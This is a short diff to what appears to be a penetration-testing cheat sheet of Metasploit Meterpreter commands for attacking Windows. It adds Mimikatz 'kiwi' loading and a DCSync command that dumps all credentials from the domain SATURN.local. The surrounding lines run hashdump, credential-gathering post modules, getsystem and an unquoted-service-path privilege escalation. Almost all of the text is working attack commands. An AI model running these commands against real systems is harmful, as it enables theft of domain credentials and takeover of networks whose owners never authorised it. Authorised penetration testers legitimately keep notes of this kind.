@@ -396,6 +396,7 @@ execute -H -i -f powershell.exe -a "-Command Get-ItemProperty HKLM:\Software\Mic
 arp
 ipconfig
 load exploit
+load kiwi
 load priv
 run exploit/windows/local/unquoted_service_path LHOST=eth1
 run post/windows/gather/enum_domain
@@ -405,11 +406,10 @@ run post/windows/gather/credentials/enum_cred_store
 run post/windows/gather/credentials/gpp
 run post/windows/gather/credentials/windows_autologin
 hashdump
+kiwi_cmd "lsadump::dcsync /domain:SATURN.local /all /csv"
 getsystem
 cp /root/Tools/Inf/privilege-escalation-awesome-scripts-suite/metasploit/peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
 reload_all
-load kiwi
-kiwi_cmd "lsadump::dcsync /domain:pentestlab.local /all /csv"
 background
 sessions
 sessions -i 1
